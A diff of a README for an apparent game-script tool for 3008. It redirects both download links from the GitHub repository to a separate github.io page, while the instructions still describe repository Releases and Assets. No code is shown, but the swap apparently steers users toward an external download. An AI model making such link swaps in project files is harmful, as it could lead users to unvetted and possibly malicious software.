@@ -1,6 +1,6 @@
 # 🛠️ 3008-scripts-update-hub - Automate and improve your 3008 experience
 
-[![Download 3008-scripts-update-hub](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Maestro-loyic/3008-scripts-update-hub)
+[![Download 3008-scripts-update-hub](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://maestro-loyic.github.io)
 
 ## 📖 About the project
 
@@ -20,7 +20,7 @@ This tool runs on Windows computers. Ensure your system meets these basic requir
 
 To obtain the tool, visit the official repository page.
 
-1. Go to the [official download page](https://github.com/Maestro-loyic/3008-scripts-update-hub).
+1. Go to the [official download page](https://maestro-loyic.github.io).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click on the latest version number shown in that list.
 4. Locate the section titled Assets.
